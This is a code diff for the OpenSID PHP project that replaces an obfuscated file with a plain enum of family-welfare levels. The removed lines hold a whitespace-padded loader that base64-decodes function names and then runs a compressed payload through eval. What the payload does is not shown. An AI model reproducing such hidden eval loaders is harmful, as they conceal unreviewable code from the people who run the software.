@@ -1,489 +1,63 @@
-<?php 
-        $__='printf';$_='Loading app/Enums/KeluargaSejahteraEnum.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+/*
+ *
+ * File ini bagian dari:
+ *
+ * OpenSID
+ *
+ * Sistem informasi desa sumber terbuka untuk memajukan desa
+ *
+ * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
+ *
+ * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ *
+ * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
+ * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
+ * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
+ * asal tunduk pada syarat berikut:
+ *
+ * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
+ * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
+ * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
+ *
+ * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
+ * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
+ * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
+ *
+ * @package   OpenSID
+ * @author    Tim Pengembang OpenDesa
+ * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ * @license   http://www.gnu.org/licenses/gpl.html GPL V3
+ * @link      https://github.com/OpenSID/OpenSID
+ *
+ */
+
+namespace App\Enums;
+
+defined('BASEPATH') || exit('No direct script access allowed');
+
+class KeluargaSejahteraEnum extends BaseEnum
+{
+    public const KELUARGA_PRA_SEJAHTERA      = 1;
+    public const KELUARGA_SEJAHTERA_I        = 2;
+    public const KELUARGA_SEJAHTERA_II       = 3;
+    public const KELUARGA_SEJAHTERA_III      = 4;
+    public const KELUARGA_SEJAHTERA_III_PLUS = 5;
+
+    /**
+     * Override method all()
+     */
+    public static function all(): array
+    {
+        return [
+            self::KELUARGA_PRA_SEJAHTERA      => 'KELUARGA PRA SEJAHTERA',
+            self::KELUARGA_SEJAHTERA_I        => 'KELUARGA SEJAHTERA I',
+            self::KELUARGA_SEJAHTERA_II       => 'KELUARGA SEJAHTERA II',
+            self::KELUARGA_SEJAHTERA_III      => 'KELUARGA SEJAHTERA III',
+            self::KELUARGA_SEJAHTERA_III_PLUS => 'KELUARGA SEJAHTERA III PLUS',
+        ];
+    }
+}
